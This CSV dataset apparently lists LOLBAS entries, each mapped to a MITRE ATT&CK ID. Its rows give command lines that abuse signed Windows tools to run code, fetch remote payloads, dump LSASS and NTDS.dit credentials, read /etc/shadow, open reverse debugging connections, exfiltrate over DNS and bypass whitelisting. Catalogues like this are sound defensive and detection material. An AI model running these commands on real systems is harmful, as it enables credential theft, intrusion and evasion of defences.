2500,Windows,procdump.exe -md {PATH:.dll} explorer.exe,Loads the specified DLL where DLL is configured with a 'MiniDumpCallbackRoutine' exported function. Valid process must be provided as dump still created.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Procdump/
2501,Windows,procdump.exe -md {PATH:.dll} foobar,"Loads the specified DLL where configured with DLL_PROCESS_ATTACH execution, process argument can be arbitrary.",Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Procdump/
2502,Windows,"AccCheckConsole.exe -window ""Untitled - Notepad"" {PATH_ABSOLUTE:.dll}",Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/AccCheckConsole/
2503,Windows,"AccCheckConsole.exe -window ""Untitled - Notepad"" {PATH_ABSOLUTE:.dll}",Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.,AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/AccCheckConsole/
2504,Windows,"logger.exe RUN ""{CMD}""",Executes the command specified after the `RUN` parameter as a child of `logger.exe`.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Logger/
2505,Windows,"logger.exe RUNW ""{CMD}""",Executes the command specified after the `RUNW` parameter as a child of `logger.exe`.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Logger/
2506,Windows,"logger.exe ""{CMD}""",Executes the command specified as a child of `logger.exe`.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Logger/
2507,Windows,cdb.exe -cf {PATH:.wds} -o notepad.exe,Launch 64-bit shellcode from the specified .wds file using cdb.exe.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Cdb/
2508,Windows,cdb.exe -pd -pn {process_name} .shell {CMD},Attaching to any process and executing shell commands.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Cdb/
2509,Windows,"cdb.exe -c {PATH:.txt} ""{CMD}""",Execute arbitrary commands and binaries using a debugging script (see Resources section for a sample file).,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Cdb/
2510,Windows,fsi.exe {PATH:.fsscript},Execute F# code via script file,AWL Bypass,Medium,T1059,https://lolbas-project.github.io/lolbas/Binaries/Fsi/
2511,Windows,fsi.exe,Execute F# code via interactive command line,AWL Bypass,Medium,T1059,https://lolbas-project.github.io/lolbas/Binaries/Fsi/
2512,Windows,MSAccess.exe {REMOTEURL},Downloads payload from remote server,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/MSAccess/
2513,Windows,winfile.exe {PATH:.exe},Execute an executable file with WinFile as a parent process.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/winfile/
2514,Windows,xbootmgrsleep.exe 1000 {PATH:.exe},"Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay. Alternatively, it is also possible to replace the delay with any string for immediate execution.",Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/XBootMgrSleep/
2515,Windows,"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -callBack {PATH:.exe}",Executes an executable after the trace is complete using the callBack parameter.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/XBootMgr/
2516,Windows,"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -preTraceCmd {PATH:.exe}",Executes an executable before each trace run using the preTraceCmd parameter.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/XBootMgr/
2517,Windows,SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe},Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/SQLToolsPS/
2518,Windows,Remote.exe /s {PATH:.exe} anythinghere,Spawns specified executable as a child process of remote.exe,AWL Bypass,Medium,T1127,https://lolbas-project.github.io/lolbas/Binaries/Remote/
2519,Windows,Remote.exe /s {PATH:.exe} anythinghere,Spawns specified executable as a child process of remote.exe,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Remote/
2520,Windows,Remote.exe /s {PATH_SMB:.exe} anythinghere,Run a remote file,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Remote/
2521,Windows,devtunnel.exe host -p 8080,Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/devtunnel/
2522,Windows,ECMangen.exe {REMOTEURL},Downloads payload from remote server,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/ECMangen/
2523,Windows,"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""quit"" ""quit""",dsdbutil supports VSS snapshot creation,Dump,High,T1003.003,https://lolbas-project.github.io/lolbas/Binaries/dsdbutil/
2524,Windows,"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""mount {GUID}"" ""quit"" ""quit""",Mounting the snapshot with its GUID,Dump,High,T1003.003,https://lolbas-project.github.io/lolbas/Binaries/dsdbutil/
2525,Windows,"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""delete {GUID}"" ""quit"" ""quit""",Deletes the mount of the snapshot,Dump,High,T1003.003,https://lolbas-project.github.io/lolbas/Binaries/dsdbutil/
2526,Windows,"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""list all"" ""mount 1"" ""quit"" ""quit""",Mounting with snapshot identifier,Dump,High,T1003.003,https://lolbas-project.github.io/lolbas/Binaries/dsdbutil/
2527,Windows,"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""list all"" ""delete 1"" ""quit"" ""quit""",Deletes the mount of the snapshot,Dump,High,T1003.003,https://lolbas-project.github.io/lolbas/Binaries/dsdbutil/
2528,Windows,"wsb start --config ""<Configuration><LogonCommand><Command>{CMD}</Command></LogonCommand></Configuration>"" wsb exec -r System --id YOUR_ID","Executes the given command in a Windows Sandbox from an inline XML configuration with an embedded `<LogonCommand>`, leaving no `.wsb` file on disk. Note: `<LogonCommand>` only fires once `WDAGUtilityAccount` actually logs in, which only happens after an RDP session is established via `wsb connect`, so this pattern opens a visible Sandbox window.",Execute,Critical,T1564.006,https://lolbas-project.github.io/lolbas/Binaries/wsb/
2529,Windows,"wsb start --config ""<Configuration><MappedFolders><MappedFolder><HostFolder>{PATH_ABSOLUTE:folder}</HostFolder><ReadOnly>false</ReadOnly></MappedFolder></MappedFolders></Configuration>"" wsb exec -r System --id YOUR_ID -c ""cmd.exe /c copy C:\users\WDAGUtilityAccount\Desktop\Temp\{PATH} {PATH}""","Allows the specified folder to be accessible from within the Windows Sandbox, mounted under `C:\users\WDAGUtilityAccount\Desktop` with the same folder name as the source folder. This allows, for example, for copying payloads from the host system into the sandbox (seen here), copying payloads from the sandbox back to the host system, or for accessing arbitrary host system files by the sandbox.",Execute,Critical,T1564.006,https://lolbas-project.github.io/lolbas/Binaries/wsb/
2530,Windows,"wsb start wsb share --id YOUR_ID -f {PATH_ABSOLUTE:folder} -s c:\SOME_FOLDER --allow-write wsb exec -r System --id YOUR_ID -c ""cmd.exe /c copy {PATH_ABSOLUTE} c:\SOME_FOLDER""","Allows the specified folder to be accessible from within the Windows Sandbox, mounted at `c:\SOME_FOLDER`. This allows, for example, for copying payloads from the host system into the sandbox, copying payloads from the sandbox back to the host system (seen here), or for accessing arbitrary host system files by the sandbox.",Execute,Critical,T1564.006,https://lolbas-project.github.io/lolbas/Binaries/wsb/
2531,Windows,dump64.exe {PID} out.dmp,Creates a memory dump of the LSASS process.,Dump,High,T1003.001,https://lolbas-project.github.io/lolbas/Binaries/Dump64/
2532,Windows,VSDiagnostics.exe start 1 /launch:{PATH:.exe},Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW to launch specified executable.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/VSDiagnostics/
2533,Windows,"VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:""{CMD:args}""",Starts a collection session with sessionID 2 and calls kernelbase.CreateProcessW to launch specified executable. Arguments specified in launchArgs are passed to CreateProcessW.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/VSDiagnostics/
2534,Windows,msxsl.exe {PATH:.xml} {PATH:.xsl},Run COM Scriptlet code within the script.xsl file (local).,Execute,Critical,T1220,https://lolbas-project.github.io/lolbas/Binaries/msxsl/
2535,Windows,msxsl.exe {PATH:.xml} {PATH:.xsl},Run COM Scriptlet code within the script.xsl file (local).,AWL Bypass,Medium,T1220,https://lolbas-project.github.io/lolbas/Binaries/msxsl/
2536,Windows,msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl},Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).,Execute,Critical,T1220,https://lolbas-project.github.io/lolbas/Binaries/msxsl/
2537,Windows,msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml},Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).,AWL Bypass,Medium,T1220,https://lolbas-project.github.io/lolbas/Binaries/msxsl/
2538,Windows,msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH},"Using remote XML and XSL files, save the transformed XML file to disk.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/msxsl/
2539,Windows,msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name,"Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS).",ADS,Medium,T1564,https://lolbas-project.github.io/lolbas/Binaries/msxsl/
2540,Windows,ProtocolHandler.exe {REMOTEURL},Downloads payload from remote server,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/ProtocolHandler/
2541,Windows,vstest.console.exe {PATH:.dll},VSTest functionality may allow an adversary to executes their malware by wrapping it as a test method then build it to a .exe or .dll file to be later run by vstest.console.exe. This may both allow AWL bypass or defense bypass in general,AWL Bypass,Medium,T1127,https://lolbas-project.github.io/lolbas/Binaries/vstest.console/
2542,Windows,windbg.exe -g {CMD},Launches a command line through the debugging process; optionally add `-G` to exit the debugger automatically.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/WinDbg/
2543,Windows,"AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""C:\Windows\SysWOW64\WindowsPowerShell\v1.0"" 0 1",Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/AgentExecutor/
2544,Windows,"AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""{PATH_ABSOLUTE:folder}"" 0 1","If we place a binary named powershell.exe in the specified folder path, agentexecutor.exe will execute it successfully",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/AgentExecutor/
2545,Windows,TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000,"Sends DNS query for open connection to any host, enabling exfiltration over DNS",Upload,Medium,T1048,https://lolbas-project.github.io/lolbas/Binaries/TestWindowRemoteAgent/
2546,Windows,"bcp ""SELECT payload_data FROM database.dbo.payloads WHERE id=1"" queryout ""C:\Windows\Temp\payload.exe"" -S localhost -T -c",Export binary payload stored in SQL Server database to file system.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Bcp/
2547,Windows,MsoHtmEd.exe {REMOTEURL},Downloads payload from remote server,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/MsoHtmEd/
2548,Windows,adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet,Creates a memory dump of the lsass process,Dump,Medium,T1003.001,https://lolbas-project.github.io/lolbas/Binaries/adplus/
2549,Windows,adplus.exe -c {PATH:.xml},Execute arbitrary commands using adplus config file (see Resources section for a sample file).,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/adplus/
2550,Windows,adplus.exe -c {PATH:.xml},Dump process memory using adplus config file (see Resources section for a sample file).,Dump,Medium,T1003.001,https://lolbas-project.github.io/lolbas/Binaries/adplus/
2551,Windows,"adplus.exe -crash -o ""{PATH_ABSOLUTE:folder}"" -sc {PATH:.exe}",Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory via '-o' is required.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/adplus/
2552,Windows,Visio.exe {REMOTEURL},Downloads payload from remote server,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Visio/
2553,Windows,dbgsrv.exe -t tcp:port=5005 -c {CMD},Creates a process server and launches the specified command using the DbgSrv.exe -c option.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/DbgSrv/
2554,Windows,"dbgsrv.exe -t tcp:clicon={HOST},port={PORT}",Establishes an outbound reverse connection from the DbgSrv process server to a remote debugging client using the clicon option. A connected debugging client can subsequently interact with processes through the remote debugging session.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/DbgSrv/
2555,Windows,Outlook.exe {REMOTEURL},Downloads payload from remote server,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Outlook/
2556,Windows,dnx.exe {PATH_ABSOLUTE:folder},Execute C# code located in the specified folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies),Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/dnx/
2557,Windows,mpiexec.exe {CMD},Executes a command via MPI command-line tool.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Mpiexec/
2558,Windows,nmcap.exe /network * /capture /file {PATH_ABSOLUTE:.cap},"Start capture on all network adapters and save to specified .cap (circular) file. Optionally, one can add: - `/TerminateWhen /TimeAfter 30 seconds` to auto-terminate after a relative times (e.g. 30 seconds); - `/TerminateWhen /Time 04:52:00 AM 9/17/2025` to auto-terminate after a specific date/time; - `/TerminateWhen /KeyPress x` to terminate when a specific key is pressed.",Reconnaissance,Low,T1040,https://lolbas-project.github.io/lolbas/Binaries/Nmcap/
2559,Windows,AppVLP.exe {PATH_SMB:.bat},Executes .bat file through AppVLP.exe,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Appvlp/
2560,Windows,"AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)""",Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Appvlp/
2561,Windows,Update.exe --download {REMOTEURL},The above binary will go to url and look for RELEASES file and download the nuget package.,Download,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Update/
2562,Windows,Update.exe --update={REMOTEURL},"The above binary will go to url and look for RELEASES file, download and install the nuget package.",AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Update/
2563,Windows,Update.exe --update={REMOTEURL},"The above binary will go to url and look for RELEASES file, download and install the nuget package.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Update/
2564,Windows,Update.exe --update={PATH_SMB:folder},"The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Update/
2565,Windows,Update.exe --update={PATH_SMB:folder},"The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Update/
2566,Windows,Update.exe --updateRollback={REMOTEURL},"The above binary will go to url and look for RELEASES file, download and install the nuget package.",AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Update/
2567,Windows,Update.exe --updateRollback={REMOTEURL},"The above binary will go to url and look for RELEASES file, download and install the nuget package.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Update/
2568,Windows,"Update.exe --processStart {PATH:.exe} --process-start-args ""{CMD:args}""",Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.,AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Update/
2569,Windows,Update.exe --updateRollback={PATH_SMB:folder},"The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Update/
2570,Windows,Update.exe --updateRollback={PATH_SMB:folder},"The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Update/
2571,Windows,"Update.exe --processStart {PATH:.exe} --process-start-args ""{CMD:args}""",Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Update/
2572,Windows,Update.exe --createShortcut={PATH:.exe} -l=Startup,"Copy your payload into ""%localappdata%\Microsoft\Teams\current\"". Then run the command. Update.exe will create a shortcut to the specified executable in ""%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"". Then payload will run on every login of the user who runs it.",Execute,Critical,T1547,https://lolbas-project.github.io/lolbas/Binaries/Update/
2573,Windows,Update.exe --removeShortcut={PATH:.exe}-l=Startup,"Run the command to remove the shortcut created in the ""%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"" directory you created with the LolBinExecution ""--createShortcut"" described on this page.",Execute,Critical,T1070,https://lolbas-project.github.io/lolbas/Binaries/Update/
2574,Windows,wsl.exe -e /mnt/c/Windows/System32/calc.exe,Executes calc.exe from wsl.exe,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Wsl/
2575,Windows,wsl.exe -u root -e cat /etc/shadow,Cats /etc/shadow file as root,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Wsl/
2576,Windows,"wsl.exe --exec bash -c ""{CMD}""",Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`),Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Wsl/
2577,Windows,wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary',Downloads file from 192.168.1.10,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Wsl/
2578,Windows,wsl.exe,"When executed, `wsl.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`, which contains a folder path (`c:\program files\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Wsl/
2579,Windows,winword.exe {REMOTEURL},Downloads payload from remote server,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Winword/
2580,Windows,VSLaunchBrowser.exe .exe {REMOTEURL:.exe},Download and execute payload from remote server,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/VSLaunchBrowser/
2581,Windows,VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe},Execute payload via VSLaunchBrowser as parent process,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/VSLaunchBrowser/
2582,Windows,VSLaunchBrowser.exe .exe {PATH_SMB},Execute payload from WebDAV server via VSLaunchBrowser as parent process,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/VSLaunchBrowser/
2583,Windows,Mftrace.exe {PATH:.exe},Launch specified executable as a subprocess of Mftrace.exe.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Mftrace/
2584,Windows,vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll},Load a library payload using the --agentExtensionPath parameter (32-bit),Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/vsls-agent/
2585,Windows,ntsd.exe -g {CMD},Launches command through the debugging process; optionally add `-G` to exit the debugger automatically.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Ntsd/
2586,Windows,teams.exe,"Generate JavaScript payload and package.json, and save to ""%LOCALAPPDATA%\\Microsoft\\Teams\\current\\app\\"" before executing.",Execute,Critical,T1218.015,https://lolbas-project.github.io/lolbas/Binaries/Teams/
2587,Windows,"teams.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",Teams spawns cmd.exe as a child process of teams.exe and executes the ping command,Execute,Critical,T1218.015,https://lolbas-project.github.io/lolbas/Binaries/Teams/
2588,Windows,"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""{PATH_ABSOLUTE:.bat}""",Launch .bat file via msdeploy.exe.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Msdeploy/
2589,Windows,"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""{PATH_ABSOLUTE:.bat}""",Launch .bat file via msdeploy.exe.,AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Msdeploy/
2590,Windows,msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext},Copy file from source to destination.,Copy,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Msdeploy/
2591,Windows,csi.exe {PATH:.cs},Use csi.exe to run unsigned C# code.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/csi/
2592,Windows,"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\"" q q",Dump NTDS.dit into folder,Dump,High,T1003.003,https://lolbas-project.github.io/lolbas/Binaries/ntdsutil/
2593,Windows,coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name,Loads the target .DLL in arbitrary path specified with /L.,Execute,Critical,T1055,https://lolbas-project.github.io/lolbas/Binaries/coregen/
2594,Windows,coregen.exe dummy_assembly_name,Loads the coreclr.dll in the corgen.exe directory (e.g. C:\Program Files\Microsoft Silverlight\5.1.50918.0).,Execute,Critical,T1055,https://lolbas-project.github.io/lolbas/Binaries/coregen/
2595,Windows,coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name,Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions.,AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/coregen/
2596,Windows,sqldumper.exe 464 0 0x0110,Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).,Dump,High,T1003,https://lolbas-project.github.io/lolbas/Binaries/Sqldumper/
2597,Windows,sqldumper.exe 540 0 0x01100:40,0x01100:40 flag will create a Mimikatz compatible dump file.,Dump,High,T1003.001,https://lolbas-project.github.io/lolbas/Binaries/Sqldumper/
